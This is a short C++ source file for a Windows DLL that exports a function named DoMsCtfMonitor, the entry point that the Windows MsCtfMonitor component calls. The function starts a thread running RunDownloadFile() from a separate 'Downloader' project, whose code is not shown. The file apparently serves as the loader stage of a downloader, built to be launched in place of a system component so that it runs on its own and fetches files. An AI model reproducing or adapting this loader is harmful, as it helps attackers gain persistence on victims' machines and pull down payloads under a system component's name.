// dllmain.cpp : Defines the entry point for the DLL application.
#include "../Downloader/Common.h"
#include "../Downloader/Downloader.h"

DWORD WINAPI WorkerThread(LPVOID lpParam) {
    RunDownloadFile();
    return 0;
}

extern "C" __declspec(dllexport) void DoMsCtfMonitor() {
    HANDLE hThread = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);  
        CloseHandle(hThread);
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{   
    HANDLE hThread;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

